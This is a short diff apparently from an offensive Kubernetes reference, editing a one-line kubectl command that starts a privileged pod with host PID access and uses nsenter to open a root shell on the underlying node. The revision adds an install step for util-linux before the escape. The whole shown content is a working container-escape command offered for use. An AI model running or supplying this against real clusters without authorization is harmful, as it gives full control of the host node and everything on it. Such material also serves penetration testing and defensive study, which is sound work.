@@ -18,5 +18,5 @@ with an overrides blob does it in one shot; peirates / Bad Pods automate the
 manifest. (Cluster — no on-host target, so no slots.)
 
 ```sh
-kubectl run pwn --rm -it --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"pwn","image":"alpine","stdin":true,"tty":true,"securityContext":{"privileged":true},"command":["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","bash"]}]}}'
+kubectl run pwn --rm -it --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"pwn","image":"alpine","stdin":true,"tty":true,"securityContext":{"privileged":true},"command":["sh","-c","apk add --no-cache util-linux >/dev/null 2>&1; nsenter -t 1 -m -u -i -n -p -- bash"]}]}}'
 ```
